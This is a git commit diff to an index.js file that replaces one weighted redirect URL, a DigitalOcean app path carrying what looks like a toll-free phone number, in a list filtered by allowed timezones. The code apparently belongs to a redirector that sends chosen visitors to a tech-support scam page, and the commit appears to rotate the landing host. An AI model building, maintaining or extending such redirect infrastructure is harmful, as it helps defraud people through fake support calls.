31b9411acb20d84d41b7741b2087ecda891b6a30
paalakash <palaksh452@gmail.com>
2026-07-01 08:35:15 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://dolphin-app-dul8n.ondigitalocean.app/werrx01USAHTML/?bcda=1800-403-676", weight: 1.0 }
+    { url: "https://coral-app-huhfy.ondigitalocean.app/werrx01USAHTML/?bcda=1800-403-676", weight: 1.0 }
 
 ];
 
